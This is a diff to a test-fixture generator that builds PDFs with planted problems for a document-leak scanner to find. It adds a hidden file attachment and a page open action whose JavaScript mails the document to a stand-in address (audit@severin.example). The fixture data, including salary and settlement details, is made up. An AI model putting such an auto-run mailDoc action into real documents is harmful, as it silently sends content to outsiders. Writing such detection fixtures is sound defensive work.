@@ -257,8 +257,11 @@ def make_pdf_redacted(path):
         1: b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 9 0 R >> "
            b"/OpenAction 8 0 R /Metadata 7 0 R >>",
         2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        # The payloads the catalog name tree does not mention: a file attached
+        # to the page through an annotation, and the page's own open action.
         3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
-           b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>",
+           b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R "
+           b"/Annots [12 0 R] /AA << /O 15 0 R >> >>",
         4: b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream",
         5: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
         7: b"<< /Type /Metadata /Subtype /XML /Length %d >>\nstream\n"
@@ -268,6 +271,12 @@ def make_pdf_redacted(path):
         10: b"<< /Type /Filespec /F (notes.txt) /EF << /F 11 0 R >> >>",
         11: b"<< /Type /EmbeddedFile /Length 48 >>\nstream\n"
             b"internal: settle below 400k, do not disclose\n\nendstream",
+        12: b"<< /Type /Annot /Subtype /FileAttachment /Rect [500 800 520 820] "
+            b"/Contents (draft) /FS 13 0 R >>",
+        13: b"<< /Type /Filespec /F (payroll-draft.csv) /EF << /F 14 0 R >> >>",
+        14: b"<< /Type /EmbeddedFile /Length 31 >>\nstream\n"
+            b"name,gross\nJan Prochazka,184000\n\nendstream",
+        15: b"<< /S /JavaScript /JS (this.mailDoc\\({cTo: 'audit@severin.example'}\\);) >>",
         6: INFO,
     }
     ident = (b"/ID [<" + PDF_FILE_ID.encode() + b"> <" + PDF_FILE_ID.encode() + b">]"
@@ -673,7 +682,10 @@ DECLARED = {
                         "XMP xmpMM:InstanceID"],
         "redaction_integrity": ["text drawn, then covered by a filled rect; still "
                                 "extractable: " + SECRET],
-        "hidden_payload": ["/OpenAction JavaScript", "/EmbeddedFiles notes.txt"],
+        "hidden_payload": ["/OpenAction JavaScript", "/EmbeddedFiles notes.txt",
+                           "page /Annots FileAttachment payroll-draft.csv, which the "
+                           "catalog name tree does not mention",
+                           "page /AA /O JavaScript, which runs on page open"],
     },
     "report-incremental.pdf": {
         "history": ["incremental update: v2 overwrites obj 4 and 6, v1 remains in the "
